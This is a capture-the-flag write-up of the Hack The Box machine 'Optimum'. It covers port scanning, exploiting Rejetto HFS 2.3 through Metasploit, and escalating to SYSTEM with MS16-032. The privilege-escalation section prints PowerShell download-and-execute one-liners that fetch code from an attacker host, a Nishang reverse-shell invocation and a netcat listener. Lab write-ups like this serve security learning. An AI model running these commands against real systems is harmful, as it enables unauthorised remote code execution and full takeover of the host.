# Hackthebox Optimum

## Recon

First let's scan all the ports of the victim with Nmap.

```
# nmap -v -sV -p- -T4 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.079s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Only one service showed up. It is a "HttpFileServer httpd 2.3".

Running this service against known exploits shows nothing.

```
root@kali:~/htb/optimum# searchsploit --nmap -v optimum_tcp_full.xml 
[i] Reading: 'optimum_tcp_full.xml'

[i] /usr/bin/searchsploit -t httpfileserver
```

Visiting the page with a browser we see the the HttpFileServer version and a link to an external website called "http://www.rejetto.com/hfs/". So it seems that "Rejetto" is developing the HFS server. 

Searching for vulerabilites with the sting "rejetto" gives us a little more to work with.

```
root@kali:~/htb/optimum# searchsploit rejetto
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                |  Path
                                                                                                                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                        | exploits/windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                             | exploits/windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                | exploits/multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                           | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                           | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                      | exploits/windows/webapps/34852.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

I was also running Gobuster against the application but that came up empty, we could definitely continue to do some content discovery if we get stuck, but for now we have a couple of leads to work with.

## Initial Compromise

We saw a couple of exploits that match the running version.

There is a Metasploit module that will get us a shell on the box.

```
msf exploit(windows/http/rejetto_hfs_exec) > exploit 

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Using URL: http://10.10.14.17:8080/7Bq94ZRg1lvo
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /7Bq94ZRg1lvo
[*] Sending stage (179779 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.8:49162) at 2018-11-19 16:23:10 +0100
[!] Tried to delete %TEMP%\LvRPDcWqmgY.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid 
Server username: OPTIMUM\kostas
```
We see that we are running a 32-bit meterpreter on a 64-bit host. We need to have this in mind for the next steps.


## Privilege Escalation

I usually run the msfmodue "multi/recon/local_exploit_suggester" against Windows boxes if I have a meterpreter shell on the box.

Output of running the exploitsuggester as 32-bit.

```
msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 28 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[*] Post module execution completed
```

Let's migrate to a 64-bit process:

```
meterpreter > migrate 2280
[*] Migrating from 2532 to 2280...
[*] Migration completed successfully.
meterpreter > sysinfo 
Computer        : OPTIMUM
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x64/windows
```

And run the module again:

```
msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x64/windows...
[*] 10.10.10.8 - 10 exploit checks are being tried...
[*] Post module execution completed
```

The second run come back empty, but we can try to use the exploits from the output of the first run.

The "ms16_032_secondary_logon_handle_privesc" in Metasploit have a 64-bit target as well that we can set.

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit 

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Writing payload file, C:\Users\kostas\Desktop\wroZljoCafka.txt...
[*] Compressing script contents...
[+] Compressed size: 3601
[*] Executing exploit script...
[+] Cleaned up C:\Users\kostas\Desktop\wroZljoCafka.txt
[*] Exploit completed, but no session was created.
```
fail #1

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit                                                                                                  
                                                                                                                                                                             
[*] Started reverse TCP handler on 10.10.14.17:4444                                                                                                                      
[-] Exploit failed: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: Access is denied.      
```

fail #2

I had many issues trying to get this exploit to work, swithcing back and forth between 32/64-bits. 

In the end I ended up doing this outside of Metasploit. 

```
root@kali:~/htb/optimum# searchsploit ms16-032
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                |  Path
                                                                                                                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Local Privilege Escalation (MS16-032) (C#)                                                                 | exploits/windows/local/39809.cs
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Secondary Logon Handle Privilege Escalation (MS16-032) (Metasploit)                                        | exploits/windows/local/40107.rb
Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)                                                      | exploits/windows/local/39719.ps1
Microsoft Windows 8.1/10 (x86) - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032)                                        | exploits/windows_x86/local/39574.cs
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

As seen above there are some standalone exploits that we could maybe get working.

I copy the powershell exploit and at the end of the file I add the following string:

```
Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17:8000/Invoke-PowerShellTcp.ps1')"
```

I then copy a Nishang powershell reverseshell into the same directory and add the following at the bottom of the file:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 1234
```

So with everything set up we need to start a webserver to serve the files and a netcat listener to catch the incomming shell.

Then we can call the exploit from the victim.

```
C:\Users\kostas\Desktop>powershell.exe -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17:8000/Invoke-MS16032.ps1')"                                                                
powershell.exe -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17:8000/Invoke-MS16032.ps1')"                                                                                        
     __ __ ___ ___   ___     ___ ___ ___
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|

                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

We see that the files are requested from our webserver.

```
root@kali:~/htb/optimum# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.8 - - [19/Nov/2018 18:03:55] "GET /Invoke-MS16032.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [19/Nov/2018 18:04:08] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

Catch the incoming shell

```
root@kali:~/htb# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.8: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.8] 49181
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami
nt authority\system
PS C:\Users\kostas\Desktop>
```

Finally, this privesc turned out to be a pain. There is a lesson here, Metasploit is not always the easiest way to go and may not always work, even if a server is vulnerable.


